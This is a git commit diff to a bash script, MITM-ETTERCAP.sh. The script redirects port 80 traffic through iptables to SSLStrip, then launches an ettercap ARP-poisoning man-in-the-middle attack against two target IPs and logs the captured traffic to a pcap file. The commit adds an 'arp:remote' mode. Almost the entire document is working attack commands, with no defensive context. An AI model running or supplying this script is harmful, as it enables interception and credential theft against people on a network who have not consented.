ad9c03f15515c588f9d2c1b7254192bb29b71bad
smoz1986 <smoz1986@users.noreply.github.com>
2016-02-27 22:32:46 +0000

    Update MITM-ETTERCAP.sh

--- MITM-ETTERCAP.sh
+++ MITM-ETTERCAP.sh
@@ -5,19 +5,25 @@ echo first configuring IP tables…
 echo Enter interface for IP tables i.e. eth0, wlan0 etc
 read -p 'Interface: ' intvar
 iptables -A PREROUTING -t nat -i $intvar -p tcp --dport 80 -j REDIRECT --to-port 10000
-read -r -p "Are you ready to start Ettercap and has SSLStrip been started? [y/N] " response
+echo Which interface to use for ettercap i.e. eth0, wlan0 etc
+read -p 'Interface: ' intervar
+read -r -p "Are you ready to start Ettercap, has SSLStrip been started and you want arp remote function? [y/N] " response
 if [[ $response =~ ^([yY][eE][sS]|[yY])$ ]]
 then
-	echo Which interface to use i.e. eth0, wlan0 etc
-	read -p 'Interface: ' intervar
 	echo Enter filename
 	read -p 'Filename: ' filevar
 	echo Enter Target 1 IP
 	read -p 'Target 1 IP: ' routervar
 	echo Enter Target 2 IP - if required
 	read -p 'Target 2 IP: ' targetvar
-	ettercap -T -i $intervar -M arp -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
+	ettercap -T -i $intervar -M arp:remote -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
 else
-    echo ettercap cancelled
+    	echo Enter filename
+ 	read -p 'Filename: ' filevar
+	echo Enter Target 1 IP
+	read -p 'Target 1 IP: ' routervar
+	echo Enter Target 2 IP - if required
+	read -p 'Target 2 IP: ' targetvar
+	ettercap -T -i $intervar -M arp -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
 echo finished
 fi
